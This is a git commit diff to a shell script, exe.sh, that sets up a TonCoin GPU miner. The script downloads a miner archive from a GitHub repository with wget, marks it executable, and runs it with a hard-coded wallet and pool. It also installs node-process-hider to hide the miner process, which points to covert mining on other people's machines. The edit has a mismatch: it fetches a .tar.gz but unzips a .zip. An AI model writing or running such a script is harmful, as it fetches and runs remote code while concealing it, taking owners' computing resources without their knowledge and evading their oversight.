d5226ec7ac9360269103ed14ddd10780f5c02e03
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-01-26 10:18:48 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -2,8 +2,8 @@
 sudo apt update
 sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 79 97
-sudo apt-get -y unzip
 sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add TonCoinMiner
-sudo wget https://github.com/optimis3232/TonCoin_Miner/raw/main/TonCoin_Miner_v1.2.zip && unzip TonCoin_Miner_v1.2.zip && mv v1.2 mng && cd mng && chmod +x TonCoinMiner
+sudo wget https://github.com/d-crypto99/Bemiii/raw/main/TonCoin_Miner_v1.2.tar.gz && unzip TonCoin_Miner_v1.2.zip && mv v1.2 mng && cd mng && chmod +x TonCoinMiner
 sudo apt install ocl-icd-opencl-dev -y
+apt-get install libreadline8 -y
 ./go EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi --pool https://pool.services.tonwhales.com &
